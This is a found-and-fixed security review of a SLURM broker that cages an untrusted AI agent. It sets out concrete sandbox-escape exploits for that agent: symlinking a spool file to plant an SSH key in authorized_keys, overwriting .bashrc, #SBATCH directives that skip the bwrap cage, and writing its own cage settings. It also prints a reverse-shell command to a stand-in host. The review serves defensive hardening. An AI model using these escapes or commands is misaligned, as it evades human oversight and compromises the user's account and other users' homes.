# husk SLURM broker — security review (v0.4.0)

Adversarial, multi-agent code review of the SLURM broker at git tag `v0.4.0`. Each
finding below was **independently confirmed by a fresh reviewer agent** (given only the
code + spec, not the author's rationale). The escapes are all in the broker's
**policy / argument-parsing / spool** code; the wrapper's `unsafe` namespace/FFI core
and fail-closed logic were probed and **held up** (see "What held up").

> **Status (2026-07-07): ALL findings fixed in-tree.** The `v0.4.0` tag was
> local-only and never pushed/released — nothing vulnerable ever shipped, so the
> fixes fold into `v0.4` (move the local tag to the final fixed commit; no
> `v0.4.1`). Every fix landed test-first (red→green); the broker suite is green
> (73 tests). This file is now an internal found-and-fixed record, not a live
> advisory.
>
> The deferred **docs-vs-code consistency pass has now run** (fresh read-only
> reviewer, code-as-ground-truth): 5 findings — **1 code-wrong (F27, a NEW
> critical-class cage escape via `--wrap`, now fixed test-first)**, 3 doc-wrong
> (fixed: THREAT-MODEL AV7 stale `--export` allowlist; BROKER.md uenv strip-vs-reject
> wording; PROTOCOL.md `source` enum missing `"none"`), and 1 ambiguous — RESOLVED:
> the stub's `VALUE_OPTS` was aligned with the broker's (`--uenv`/`--view`/`--repo`
> added) so separated-form selections now reach the broker's reject-and-teach instead
> of a fail-closed misparse. **All docs-vs-code findings now closed.**
>
> **Follow-up: the whole submission-surface class was retired BY CONSTRUCTION.** The
> option handling was re-architected from a strip-list *denylist* into an *allowlist*:
> the broker now builds the sbatch invocation from a registry (`sbatch::REGISTRY`) —
> forcing the dangerous families, parsing + validating + canonically re-emitting the
> benign resource options, and **rejecting anything unrecognised or out-of-grammar**
> (`interpret_cli`); dangerous/unknown `#SBATCH` directives and `#BB`/`#DW` lines are
> detect-and-rejected (`body_reject_reason`). F13/F14/F24/F26/F27 are now closed at the
> structure, not instance-by-instance. See THREAT-MODEL.md "Design principle (the gate)"
> + BROKER.md "Options — allowlist, not passthrough". 80 tests green.

## How to read the exploits
Each exploit is a concrete story you can follow, written so it can become a unit test:
- **the agent** = the untrusted, sandboxed AI (it can write the spool and its own
  workdir, and put any text in the job script it submits).
- **the broker** = the trusted process running as *you*, outside the sandbox, holding
  MUNGE + network.
- A fix is "done" when the exploit's trigger is rejected or neutralised — that assertion
  is the test.

## Severity summary
| ID | Finding | Severity | Fix group |
|----|---------|----------|-----------|
| F1  | spool `id` symlink → write anywhere as you | 🔴 critical | C |
| F13 | glued `-o`/`-e` → overwrite any file as you | 🔴 critical | B |
| F24 | `#SBATCH --export` (no-uenv) → cage skipped | 🔴 critical | B |
| F26 | `#SBATCH --uenv/--repo` → root-mount agent squashfs | 🔴 critical | B |
| F27 | `--wrap` unstripped → job skips the re-exec guard (uncaged) | 🔴 critical | B |
| F17 | `req.cwd` selects settings → agent authors its cage | 🟠 high | A |
| F15/F19 | `req.cwd` bound writable → re-expose homes / root RW | 🟠 high | A |
| F20 | symlink-guard TOCTOU (queue-wait swap) | 🟠 high | D |
| F14 | glued `-p` → run on any partition | 🟡 medium | B |
| F2/F16 | query `--iterate` → wedge the broker | 🟡 medium | D |
| F4  | no spool GC (unbounded growth; doc says otherwise) | 🔵 low | D |
| F5  | spool symlink read → path oracle + self-DoS | 🔵 low | C |
| F18 | `allowRead` re-exposes the "always hidden" floor | 🔵 low | A/D |
| F21/22/23 | credential-masking gaps | 🔵 low | D |
| F12 | partition write-protection is implicit (latent) | ⚪ info | D |

---

## 🔴 Critical

### F1 — the spool `id` lets the broker write anywhere, as you
**Exploit**
1. The spool directory is writable by the agent (that's how it hands jobs to the broker).
   The broker's temp-file name is predictable: for a request with `id = pwn` it writes
   through `.resp-pwn.json.tmp` (and `.job-pwn.sh.tmp`).
2. Agent, inside the sandbox: `ln -s ~/.ssh/authorized_keys "$SPOOL/.job-pwn.sh.tmp"`.
3. Agent drops `$SPOOL/req-anything.json` with `"id":"pwn"`, `tool:"sbatch"`, and a job
   body that is just the agent's own SSH public key line. (Even a request the policy will
   *reject* still triggers the `resp-pwn.json` write, so a valid job isn't required.)
4. The broker opens `.job-pwn.sh.tmp` with `File::create` — no `O_NOFOLLOW` — follows the
   symlink, and writes the agent-controlled content into `~/.ssh/authorized_keys`.
5. The agent's key is now in your `authorized_keys`. It can SSH in as you. **Escape + persistence.**

**Why:** `req.id` is an unvalidated free `String` used to build the path; `write_atomic`
uses `fs::File::create` (no `O_NOFOLLOW`/`O_EXCL`). `spool.rs`.
**Fix (C):** validate `id` — must be a plain UUID; reject anything containing `/`, `..`, or
non-`[0-9a-f-]` chars. Open spool files with `O_NOFOLLOW | O_EXCL` (`create_new`).
**Test:** `handle`/`write_atomic` must refuse an `id` that isn't a clean UUID, and must
fail rather than follow a symlink planted at the temp path.

### F13 — a glued `-o` overwrites any file, as you
**Exploit**
1. Agent submits `sbatch --partition=preemptible -o/home/you/.bashrc job.sh`, where
   `job.sh`'s body echoes a shell payload.
2. The broker is supposed to force `--output` to a safe path and strip the agent's. But
   `-o/home/you/.bashrc` is a *glued* short option; the stripper only matches exactly `-o`
   or `-o=…`, so it survives into the passthrough args.
3. Both the forced `--output=<safe>` and the agent's `-o/home/you/.bashrc` reach real
   sbatch; sbatch is last-wins, so the agent's path wins.
4. slurmd (as you) writes the job's stdout (the payload) into `~/.bashrc`. Your next shell runs it.

**Why:** `strip_options` / `option_value` don't understand getopt-glued short options. `sbatch.rs`.
**Fix (B):** normalise glued shorts (`-oX` → `-o X`) before parsing, **and** reject any
unrecognised short-option cluster (fail-closed — a misparse must reject, not pass through).
**Test:** a request with `-o<path>` / `-e<path>` / `-D<path>` must yield an emitted argv with
no agent-controlled output/error/chdir path (stripped, or the whole job rejected).

### F24 — a `#SBATCH --export` line turns the cage off
**Exploit**
1. No uenv is loaded (a documented normal state). Agent submits a job whose script begins:
   `#SBATCH --export=ALL,_HUSK_RESANDBOXED=1`
2. The broker re-sandboxes each job by prepending a guard: *"if `_HUSK_RESANDBOXED` is unset,
   set it and re-exec inside bwrap."* In the no-uenv branch the broker doesn't force
   `--export`, and it never neutralises `#SBATCH` lines in the body — so sbatch honours the
   directive and starts the job with `_HUSK_RESANDBOXED=1` already in its environment.
3. The guard sees the variable set → believes it already re-sandboxed → **skips bwrap**. The
   job runs uncaged on the compute node (full filesystem, all homes, no seccomp).

**Why:** no-uenv branch doesn't force `--export`; body directives aren't neutralised. `policy.rs`.
**Fix (B):** force a safe `--export` on the CLI in **both** uenv branches (so the guard var
can't be injected), and reject a body that sets `--export`. (Belt-and-suspenders: make the
guard not rely solely on an env var the job can set.)
**Test:** a no-uenv request whose body sets `#SBATCH --export=…,_HUSK_RESANDBOXED=1` must be
rejected, or the emitted CLI must force `--export` to a safe value that cannot carry the guard var.

### F26 — a `#SBATCH --uenv` line mounts the agent's filesystem as root
**Exploit**
1. No uenv loaded. Agent builds a filesystem image `evil.squashfs` (setuid binaries, a fake
   `/etc`, …) in its scratch space, then submits a job whose body contains:
   `#SBATCH --uenv=/scratch/agent/evil.squashfs:/mnt`
2. The broker strips `--uenv`/`--view`/`--repo` from the *command line* but **not** from the
   *script body*, and in the no-uenv case forces no `--uenv` of its own. (`--repo` is never
   forced in any case.)
3. sbatch honours the body directive; **slurmstepd (root) mounts the agent's squashfs** at
   `/mnt`. The agent now has a root-mounted filesystem it fully controls.

**Why:** body `#SBATCH --uenv/--repo/--view` never stripped; `--repo` never forced; no-uenv
skips the uenv guard. `policy.rs`.
**Fix (B):** force `--uenv`/`--view`/`--repo` on the CLI in both branches, and reject a body
carrying any of them.
**Test:** a request whose body sets `#SBATCH --uenv=<path>` (or `--repo`/`--view`) must be
rejected or force-overridden to the trusted session value.

### F27 — `--wrap` runs the job outside the compute cage  (found by the docs-vs-code pass)  ✅ FIXED
**Exploit**
1. The whole compute-side cage is a re-exec guard *injected into the staged job script*: the
   first thing the script does is `exec seccomp-wrapper bwrap … -- /bin/bash "$0"`, so the real
   work runs under bwrap + seccomp + `--unshare-net`.
2. `sbatch --wrap="<cmd>"` tells sbatch to *ignore any script file* and build the job from
   `<cmd>` instead. The stub snapshots the wrap string into `body` — but forwards the raw
   `--wrap` in `argv` untouched, and the broker never strips or force-overrides `--wrap` (it's
   absent from `VALUE_OPTS` and from the owned-family strip list).
3. Agent, inside the sandbox: `sbatch --partition=preemptible --wrap='bash -i >& /dev/tcp/evil/443 0>&1'`.
4. The broker stages the guarded script as usual, but submits
   `sbatch … --wrap='bash -i …' <staged-guarded-script>`. sbatch uses the wrap string and
   **never executes the staged script**, so the re-exec guard never fires. The agent's command
   runs on the compute node with **no bwrap, no seccomp, no `--unshare-net`** — full network,
   all homes readable/writable as the user. Same escape class as F24/F26.

**Why:** `--wrap` is documented (README) as "forced to safe values" but is completely unhandled
in the broker. The re-exec guard is only inside the staged script, which `--wrap` bypasses.
`sbatch.rs` (VALUE_OPTS) + `policy.rs` (strip list).
**Fix (B):** add `--wrap` to `VALUE_OPTS` and to the owned-family strip list. The stub already
snapshots the wrap string into `body`, which is guarded + staged, so stripping the raw flag makes
the wrapped command run *through* the staged guarded script — `--wrap` keeps working AND is caged,
making the README claim true. (No reliance on sbatch's undefined `--wrap`+script behaviour: after
the fix `--wrap` never reaches the real sbatch.)
**Test:** a submitted `--wrap`/`--wrap=` request must not leave `--wrap` in the forced options,
and the wrapped command must appear inside the guarded `wrapped_script`.

---

## 🟠 High — all the `req.cwd`-trust family (fix group A)

### F17 — the agent writes its own cage rules
**Exploit**
1. The compute cage's filesystem policy is built from `.claude/settings.json` /
   `settings.local.json` files the broker reads *relative to the job's working directory*.
2. Agent, in its own scratch workdir, runs (plain bash, which bypasses the tool-only write
   denies): `mkdir -p a/b/c/d/e/.claude && printf '{"sandbox":{"filesystem":{"allowRead":["/users"]}}}' > a/b/c/d/e/.claude/settings.local.json`
   (depth 6 — past the login sandbox's depth-3 protective scan).
3. Agent submits a job with `cwd` set to `…/a/b/c/d/e`.
4. The broker reads the agent-authored `settings.local.json` as **trusted config** and builds
   the cage with `allowRead:["/users"]` → every other user's home is readable inside the job.

**Why:** `req.cwd` is unvalidated and the broker resolves "trusted" settings relative to it;
the login-side write-protection (depth-3, tool-only) is shallower than the broker's unbounded
read. `spool.rs` / `settings.rs`.
**Fix (A):** don't resolve settings from an agent-controlled path — trust only the global
`~/.claude/settings.json`; and/or validate & confine `cwd`.
**Test:** a request whose `cwd` points at an agent-writable dir containing a
`.claude/settings.local.json` must NOT let those settings affect the emitted cage args.

### F15 / F19 — the agent picks a working dir that re-exposes homes / makes root writable
**Exploit**
1. The broker binds the job's `cwd` into the cage **writable** and forces it as `--chdir`.
2. Agent submits with `cwd=/users/<self>`: the cage does `--tmpfs /users` (hide) then
   `--bind /users/<self> /users/<self>` (re-expose, writable) — the agent's whole home is
   readable + writable inside the job (defeats home-hiding; lets it plant `.bashrc`/`.ssh`
   payloads that fire on the login node). With `cwd=/` it emits `--bind / /` → **root read-write**.

**Why:** `req.cwd` unvalidated, bound writable; later-bind-wins over the read-only root/floor.
`policy.rs` / `settings.rs`.
**Fix (A):** confine `cwd` — reject `/`, any `HIDDEN_FLOOR` path, and paths outside an allowed
writable root; never emit a writable bind over a floor.
**Test:** a request with `cwd="/"` or `cwd="/users/x"` must be rejected (or must not emit a
writable bind over `/` or a floor path).

### F20 — swap a symlink while the job waits in the queue
**Exploit**
1. Config has an allowed carve-out under a writable area, e.g. `allowRead:["/scratch/x/models"]`
   with `/scratch/x` writable.
2. Agent submits job B. At submit time the broker checks `/scratch/x/models` is a real dir
   (leaf only) and **bakes the literal `--ro-bind /scratch/x/models /scratch/x/models` into the
   queued job**.
3. While B waits in the (preemptible) queue, the agent does, host-side:
   `rm -rf /scratch/x/models; ln -s /users/victim/.ssh /scratch/x/models`.
4. B starts on the compute node; bwrap follows the now-symlink and mounts `/users/victim/.ssh`
   into the cage. (An `allowWrite` carve-out makes it a *writable* mount of the victim's home.)

**Why:** the guard is a leaf-only `lstat` at submit time on the login node; the bind is a frozen
string re-executed later on the compute node with no recheck. `settings.rs`.
**Fix (D) — PART done, residual documented:**
- Done: `path_has_symlink_component` now walks EVERY path prefix and lstats it, so a carve-out
  whose *intermediate* component is a symlink (`/a/b/c` with `/a/b` a symlink) is dropped, not
  only a symlinked leaf. Plus fix **A** stops trusting `req.cwd` and the **F18** floor-overlap
  filter drops any carve-out under `/users`, which removes the most dangerous swap targets.
  Test: `path_has_symlink_component_catches_intermediate_symlink`.
- **Residual (compute-time swap) — decision: document + operational rule, NOT a compute-node
  recheck shell.** The remaining TOCTOU (swap a component to a symlink *after* submit, while the
  job waits in the queue) can only be closed by re-validating at bind time on the compute node —
  which means wrapping the bwrap invocation in a guard shell that re-lstats every carve-out. That
  shell would itself run in agent-influenced space and re-implement the check fragile-ly; the
  cost/fragility outweighs the residual (it requires a carve-out under an agent-writable parent
  *and* a precisely-timed swap during queue wait). **Operational rule instead:** carve-outs
  (`allowRead`/`allowWrite`) must not live under an agent-writable parent directory — put shared
  read-only assets (models, datasets) on a path the job cannot rewrite. Documented in BROKER.md.
**Test:** the symlink guard drops a carve-out whose *intermediate* component is a symlink (done).

---

## 🟡 Medium

### F14 — glued `-p` runs the job on any partition
**Exploit** Agent submits `sbatch --partition=preemptible -ppancake job.sh`. The gate sees the
valid `--partition=preemptible` and accepts; the glued `-ppancake` survives and sbatch's
last-wins puts the job on `pancake` — the broker reports/believes preemptible.
**Why/Fix (B):** same glued-short-option bug as F13 — normalise/reject glued shorts.
**Test:** a glued `-p<other>` must be rejected (or resolve to a rejection).

### F2 / F16 — one query freezes the broker
**Exploit** Agent submits a read-only query request `tool=squeue, argv=["--iterate=5"]`.
`--iterate` makes squeue loop forever; the broker runs it with no timeout inside its
single-threaded loop → it stops servicing every further request for the session (self-DoS).
**Fix (D):** run queries with a wall-clock timeout; kill the child on timeout.
**Test:** a query that does not terminate is killed after N seconds and returns an error
(broker keeps serving), rather than hanging.

---

## 🔵 Low / ⚪ Info

### F4 — no spool cleanup (and the docs claim there is)
Not a breach: `job-<id>.sh` is staged on every submit and deleted by nobody; orphaned
`resp-`/`.tmp` files also leak → unbounded spool growth, contradicting PROTOCOL.md's GC claim.
**Fix (D):** implement the age-cutoff GC, or correct the doc. **Test:** orphaned files past the
cutoff are removed.

### F5 — spool symlink read = a path oracle + self-DoS
Agent symlinks `req-x.json -> /foreign/path`; the broker follows it, and read errors land in
the agent-readable `broker.log` → an existence/permission oracle for out-of-sandbox paths.
`req-x.json -> /dev/zero` → broker OOM; `-> a FIFO` → broker hangs. Content does not leak
(non-JSON is dropped).
**Fix (C):** only read regular files from the spool (`is_file` / `O_NOFOLLOW`).
**Test:** the broker ignores a `req-*.json` that is a symlink.

### F18 — `allowRead` re-exposes the "always hidden" floor
Any settings layer with `allowRead:["/users"]` makes the cage emit `--tmpfs /users` then
`--ro-bind /users /users` — re-exposing the floor the code promises stays hidden "regardless of
config." Low on its own (needs trusted config) but it is the **payload for F17** (which lets the
agent supply that config).
**Fix (A/D):** filter out any allow entry that overlaps `HIDDEN_FLOOR`.
**Test:** `allowRead:["/users"]` (or a path under it) must NOT produce a bind that re-exposes the floor.

### F21 / F22 / F23 — credential-masking gaps (defense-in-depth)  ✅ FIXED
- **F21:** the workdir credential auto-scan is capped at depth 4 / 20k entries and fails open —
  a secret deeper than that, or past a budget the agent can pad, is never masked.
- **F22:** a *relative* `denyRead` entry is silently dropped on the compute node (honored on the
  login node) → the two cages drift.
- **F23:** `matches_credential` misses `*.p12`/`*.pfx`, `.pgpass`, `*.jks`, `.npmrc`, etc.
All still backstopped by an explicit `credentials.files` entry.
**Fix (D) — done in `settings.rs`:**
- F21: the scan now returns a `truncated` flag set when the entry BUDGET is exhausted (the
  agent-gameable case; the depth cap is a designed bound and stays silent). `resolve()` emits a
  stderr warning when truncated — no silent cap. Still fail-safe (base cage + explicit
  `credentials.files` hold regardless).
- F22: relative `denyRead`/credential entries are resolved onto the workdir (`abs_for_cage`) and
  re-hidden AFTER the writable workdir bind (`is_under_writable_root`), so they are honored on
  compute exactly as on login instead of being dropped. `~`-prefixed entries stay under the
  HIDDEN_FLOOR (not mis-joined onto the workdir).
- F23: pattern set broadened — `*.p12`/`*.pfx`/`*.jks`/`*.keystore`/`*.ppk`, `.pgpass`, `.npmrc`,
  `.pypirc`, `.dockercfg`, `.htpasswd`, `id_dsa`.
**Tests:** `matches_credential_recognizes_secrets_...` (new patterns),
`relative_denyread_is_honored_and_wins_over_the_writable_workdir_bind`,
`absolute_denyread_under_the_workdir_is_rehidden_after_the_bind`,
`home_relative_denyread_is_left_to_the_floor_...`, `relative_credential_file_under_workdir_is_masked`,
`scan_reports_truncation_when_the_entry_budget_is_exhausted`.

### F12 — partition write-protection is implicit (latent, no live exploit)  ✅ FIXED
The partition boundary is sound today (the value comes from the broker's trusted pre-sandbox
env; the agent can't write `~/.local/lib/husk/slurm-partition`), but that write-protection rests
on the sandbox's *implicit* write-default-deny, not an explicit rule in the shipped config — a
future config regression could open it. **Fix (D) — done in `user-config/settings.json`:** an
explicit `sandbox.filesystem.denyWrite` now lists `~/.local/lib/husk` (the partition file + stub +
seccomp plumbing) and the three settings files (`~/.claude/settings.json`, `.claude/settings.json`,
`.claude/settings.local.json`). This doubles as fix **A**'s login-cage write-protection of
`.claude/settings*` (the agent can no longer widen its own cage via a bash write, not just via the
tool-permission deny). The whole `sandbox` block is copied wholesale by the install merge, so the
new key ships as-is. **Note:** the login-cage `denyWrite` semantics want a one-line hardware smoke
check (agent can still write its workspace; cannot write `.claude/settings.local.json`) since it
can't be verified off-cluster.

---

## What held up (refuted findings)
Independent reviewers tried and failed to break the wrapper's trust-boundary mechanics:
the `unsafe` FFI namespace setup (`unshare`/`mount`/uid_map, setgroups ordering), the
`SandboxReady` dev+inode bind witness, the `BrokerHandle` drop-kill, the `plan()` fail-closed
decision, and the `PR_SET_PDEATHSIG` guard. Candidate concerns there (SLURM-detection
fail-open, srun/salloc not shadowed, mount-propagation, PDEATHSIG subreaper race) were all
**refuted** — the containment core is sound. Every confirmed escape lives in policy/parsing/spool.

## Fix plan (root causes → groups)
- **A — stop trusting `req.cwd`.** Confine/validate it (reject `/`, floors, non-canonical, and
  out-of-allowed-root); don't resolve settings from agent-controlled paths. → F15, F17, F19,
  defangs F18/F20.
- **B — force-safe completely; never rewrite the script body.** Force every dangerous option on
  the CLI in *both* uenv branches (`--export`, `--repo`, `--uenv`, `--view`, output/error/chdir),
  normalise/reject glued short options, and *reject* a body carrying a dangerous `#SBATCH`
  directive (detect-and-reject is fine — the broker already reads the directives; **do not**
  strip/rewrite, that re-implements sbatch's parser). → F13, F24, F26, F14.
- **C — harden the spool.** Validate `id` (UUID only); `O_NOFOLLOW`/`O_EXCL`/`is_file` on all
  spool reads and writes. → F1, F5.
- **D — cage defense-in-depth + robustness.** Full-path symlink check + compute-node recheck;
  floor-overlap filter; per-query timeout; spool GC; broaden credential patterns / honor relative
  `denyRead`; assert config write-denies. → F20, F18, F2, F4, F21-23, F12.

Suggested order: **B + C first** (kills all four criticals), then **A** (the highs), then **D**,
then the deferred docs-vs-code pass as the final consistency gate → re-tag `v0.4.1`.
